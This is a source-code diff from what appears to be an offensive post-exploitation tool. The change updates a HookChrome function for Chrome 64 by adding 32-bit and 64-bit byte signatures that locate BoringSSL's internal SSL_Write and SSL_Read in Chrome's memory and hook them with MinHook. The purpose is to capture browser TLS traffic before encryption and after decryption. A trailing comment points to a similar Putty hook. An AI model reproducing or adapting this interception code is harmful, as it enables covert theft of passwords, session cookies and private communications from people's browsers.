@@ -2,21 +2,30 @@
 #include "stdafx.h"
 #include "NonExportedHooks.h"
 
-// New version of Chrome - BoringSSL
+// Chrome 64
 
 void HookChrome()
 {
 	SECTION_INFO rdata = {0, 0};
 	SECTION_INFO text  = {0, 0};
 
-	// Specific binary data
+	// 64 bits signatures
 
-	unsigned char Write_Signature[] = { 
+	unsigned char Write_Signature64[] = { 
 		0x41, 0x57, 0x41, 0x56, 0x56, 0x57, 0x55, 0x53, 0x48, 0x83, 0xEC, 0x28, 0x49, 0x89, 0xD6, 0x41, 
 		0xC6, 0x06, 0x00, 0x44, 0x89, 0xCD, 0x4D, 0x89, 0xC7, 0x48, 0x89, 0xCF, 0x48, 0x8B, 0x47, 0x30 };
-	unsigned char Read_Signature[] = {
+	unsigned char Read_Signature64[] = {
 		0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x44, 0x89, 0xC6, 0x48, 0x89, 0xD7, 0x48, 0x89, 0xCB, 
 		0xE8, '?' , '?' , '?' , '?' , 0x85, 0xC0, 0x7E, 0x2C, 0x85, 0xF6, 0x7E, 0x2A, 0x48, 0x63, 0xCE };
+
+	// 32 bits signatures
+
+	unsigned char Write_Signature32[] = {
+		0x55, 0x89, 0xE5, 0x53, 0x57, 0x56, 0x83, 0xEC, 0x08, 0xA1, '?' , '?' , '?' , '?' , 0x8B, 0x7D, 
+		0x08, 0x89, 0x45, 0xF0, 0x8B, 0x47, 0x20, 0xC7, 0x80, 0x98, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00 };
+	unsigned char Read_Signature32[] = {
+		0x55, 0x89, 0xE5, 0x57, 0x56, 0x8B, 0x7D, 0x08, 0x89, 0xF9, 0xE8, '?' , '?' , '?' , '?' , 0x89, 
+		0xC6, 0x85, 0xF6, 0x7E, 0x2D, 0x8B, 0x4D, 0x10, 0x85, 0xC9, 0x7E, 0x20, 0x8B, 0x47, 0x20, 0x8B };
 
 	// Get section
 
@@ -32,22 +41,43 @@ void HookChrome()
 
 	// Search memory
 
-	ADDRESS_VALUE pWrite = Process::SearchSignature((void *)text.dwStartAddress, text.dwSize, (void *)Write_Signature, sizeof(Write_Signature));
-	ADDRESS_VALUE pRead = Process::SearchSignature((void *)text.dwStartAddress, text.dwSize, (void *)Read_Signature, sizeof(Read_Signature));
+	ADDRESS_VALUE pWrite64 = Process::SearchSignature((void *)text.dwStartAddress, text.dwSize, (void *)Write_Signature64, sizeof(Write_Signature64));
+	ADDRESS_VALUE pRead64  = Process::SearchSignature((void *)text.dwStartAddress, text.dwSize, (void *)Read_Signature64, sizeof(Read_Signature64));
 
-	if(pWrite == 0 || pRead == 0)
+	ADDRESS_VALUE pWrite32 = Process::SearchSignature((void *)text.dwStartAddress, text.dwSize, (void *)Write_Signature32, sizeof(Write_Signature32));
+	ADDRESS_VALUE pRead32  = Process::SearchSignature((void *)text.dwStartAddress, text.dwSize, (void *)Read_Signature32, sizeof(Read_Signature32));
+
+	// We have the x64 versions
+
+	if(pWrite64 && pRead64)
 	{
-		DebugLog::Log("[ERROR] Cannot get Chrome SSL functions!");
+		// Add hooks
+
+		SSL_Write_Original64 = (SSL_Write_Typedef64)pWrite64;
+		SSL_Read_Original64  = (SSL_Read_Typedef64)pRead64;
+
+		MH_CreateHook((void *)pWrite64, (void *)SSL_Write_Callback64, &((void *)SSL_Write_Original64));
+		MH_CreateHook((void *)pRead64,  (void *)SSL_Read_Callback64,  &((void *)SSL_Read_Original64));
+
 		return;
 	}
 
-	// Add hooks
+	// We have the x86 versions
 
-	SSL_Write_Original = (SSL_Write_Typedef)pWrite;
-	SSL_Read_Original = (SSL_Read_Typedef)pRead;
+	if (pWrite32 && pRead32)
+	{
+		// Add hooks
 
-	MH_CreateHook((void *)pWrite, (void *)SSL_Write_Callback, &((void *)SSL_Write_Original));
-	MH_CreateHook((void *)pRead, (void *)SSL_Read_Callback, &((void *)SSL_Read_Original));
+		SSL_Write_Original32 = (SSL_Write_Typedef32)pWrite32;
+		SSL_Read_Original32  = (SSL_Read_Typedef32)pRead32;
+
+		MH_CreateHook((void *)pWrite32, (void *)SSL_Write_Callback32, &((void *)SSL_Write_Original32));
+		MH_CreateHook((void *)pRead32,  (void *)SSL_Read_Callback32,  &((void *)SSL_Read_Original32));
+
+		return;
+	}
+
+	DebugLog::Log("[ERROR] Cannot get Chrome SSL functions!");
 }
 
 // Hook Putty - (c) PuttyRider - Adrian Furtuna
